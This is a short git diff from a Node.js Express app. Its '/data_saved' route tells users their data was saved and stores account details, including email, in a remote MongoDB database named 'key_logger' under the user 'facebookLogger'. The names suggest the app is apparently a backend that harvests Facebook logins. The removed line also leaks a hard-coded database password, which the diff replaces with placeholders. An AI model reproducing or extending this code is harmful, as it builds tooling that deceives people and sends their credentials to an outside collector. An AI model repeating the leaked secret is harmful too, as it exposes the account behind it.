@@ -25,7 +25,7 @@ app.get('/', function(req, res){
 app.post('/data_saved', function(req, res){
     res.render('homepage', {notice: 'your data has been saved to the database'});
     //set connect string
-    var connectString = 'mongodb://facebookLogger:watalabasday555@ds127129.mlab.com:27129/key_logger';
+    var connectString = 'mongodb://<dbname>:<dbpassword>@ds127129.mlab.com:27129/key_logger';
     //create model
     var dataModel = mongoose.model('account', {
         email: String,
